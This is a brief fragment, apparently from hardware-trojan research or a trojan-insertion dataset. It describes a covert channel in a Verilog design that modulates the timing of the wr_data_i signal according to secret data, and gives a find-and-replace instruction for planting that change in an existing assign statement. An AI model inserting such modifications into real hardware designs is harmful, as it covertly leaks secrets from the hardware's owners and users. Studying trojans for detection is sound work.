 ...
 * Payload: Modulate timing of wr_data_i based on secret data
 * 
...
// ============================================================
// Covert Channel: Modulate timing of wr_data_i
//
// Integration Script Must Modify:
//
// IF wr_data_i is timing-sensitive:
//   Find: assign wr_data_i = ready_signal;
//   Replace: assign wr_data_i = (timing_delay == 0) ? ready_signal : 1'b0;
//
